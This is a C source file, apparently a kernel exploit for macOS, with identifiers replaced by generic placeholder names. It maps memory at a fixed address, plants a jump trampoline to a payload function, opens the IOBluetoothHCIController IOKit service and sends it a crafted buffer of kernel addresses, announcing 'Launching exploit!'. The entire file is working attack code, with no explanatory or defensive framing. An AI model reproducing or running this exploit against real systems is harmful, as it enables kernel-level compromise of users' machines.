
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int vm_address_t ;
typedef scalar_t__ uint64_t ;
typedef int uint32_t ;
typedef int mach_port_t ;
typedef scalar_t__ kern_return_t ;
typedef int io_service_t ;
typedef int io_connect_t ;
typedef int a ;


 scalar_t__ FUNC_0 (int ,int ,int *,int ,void const*,int,int *,int *,int *,int *) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int ,int ) ;
 int FUNC_4 (char*) ;
 scalar_t__ FUNC_5 (int ,int ,int ,int*) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 int FUNC_6 () ;
 int FUNC_7 (void*,int ,int) ;
 scalar_t__ VAR_5 ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int ,int*,int,int ) ;
 int FUNC_10 (int ,int,int,int ,int) ;

int FUNC_11(void) {

  vm_address_t VAR_6 = 0x0000048800000000;
  FUNC_9(FUNC_6(), &VAR_6, 0x1000, 0);
  FUNC_10(FUNC_6(), VAR_6, 0x1000, 0,
      VAR_1|VAR_2|VAR_0);
  FUNC_7((void *)VAR_6, 0, 0x1000);


  char *VAR_7 = (char *)VAR_6;


  VAR_7[7] = 0x48;
  VAR_7[8] = 0xb8;
  *((uint64_t *)(&VAR_7[9])) = (uint64_t) VAR_5;


  VAR_7[17] = 0xff;
  VAR_7[18] = 0xe0;

  FUNC_8(" [+] Payload function  @ %016llx\n", (uint64_t) VAR_5);
  FUNC_8(" [+] Stored trampoline @ %016llx\n", (uint64_t) VAR_6+7);


  io_service_t VAR_8 =
    FUNC_3(VAR_3,
    FUNC_4("IOBluetoothHCIController"));

  if (!VAR_8) {
    return -1;
  }


  io_connect_t VAR_9 = (io_connect_t) 0;
  kern_return_t VAR_10 = FUNC_5(VAR_8, FUNC_6(), 0, &VAR_9);
  FUNC_1(VAR_8);
  if (VAR_10 != VAR_4) {
    return VAR_10;
  }

  FUNC_8(" [+] Opened connection to service on port: %d\n", VAR_9);



  char VAR_11[] = "\x00\x00\x00\x00\x00\x00\x00\x00"

    "\x00\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\x00\x11\x0a\x00\x00\x03\x72\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\xfa\x2a\x54\xff\x7f\x00\x00\x78\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xa8\xfb\x2a\x54\xff\x7f\x00\x00\xd8\xfa\x2a\x54\xff\x7f\x00\x00\x60\x4a\xb6\x86"
    "\x80\xff\xff\xff"



    "\xa8\xb6\xf5\xff\x80\xff\xff\xff";

  FUNC_8(" [+] Launching exploit!\n");
  VAR_10 = FUNC_0((mach_port_t) VAR_9,
                           (uint32_t) 0,
                           ((void*)0), 0,
                           (const void*) VAR_11,
                           sizeof(VAR_11),
                           ((void*)0), ((void*)0), ((void*)0), ((void*)0));



  return FUNC_2(VAR_9);
}
